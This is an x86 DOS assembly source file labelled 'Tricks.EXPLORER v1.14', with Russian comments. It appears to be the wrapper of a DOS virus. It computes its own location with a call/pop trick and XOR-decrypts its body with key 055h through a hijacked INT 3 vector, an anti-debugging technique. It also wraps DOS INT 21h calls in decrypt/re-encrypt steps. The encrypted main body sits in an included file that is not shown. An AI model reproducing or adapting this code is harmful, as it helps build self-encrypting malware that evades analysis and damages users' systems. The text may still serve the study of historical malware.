;************************************************
;*	Tricks.EXPLORER v1.14                   *
;************************************************
.286
TestS	segment
	assume	cs:TestS,ds:TestS,ss:TestS
	org	100h
;
Shift	= ((Next-Start)+100h)	
CryptLen= CopyRT-Crypted
;
Start:
	call	Next
Next:
	pop	si
	sub	si,Shift
	call	Crypt	
;
Crypted:
;************************************************
	include	trexp.inc ; Зашифровано         *
;************************************************
CopyRT	db	0,'[Tricks.EXPLORER] v1.14',0
;
WriV:
	call	Crypt
	int	21h
	call	Crypt
	ret
;************************************************
;*	Расшифровщик                            * 
;************************************************
Point:
	add	sp, 6
	pusha
	mov	al, 055h
	lea	bx, Crypted[si]
	mov	cx, CryptLen
Circle:	
	xor	byte ptr [bx], al
	inc	bx
	loop	Circle
	popa
	ret
Crypt:
	push	ds
	xor	ax, ax
	mov	ds, ax
	mov	ds:word ptr [3*4], offset Point
	add	ds:word ptr [3*4], si
	mov	ds:word ptr [3*4+2], cs
	pop	ds
	int	3
;
Finish:
;
Tests	ends
	End	Start
				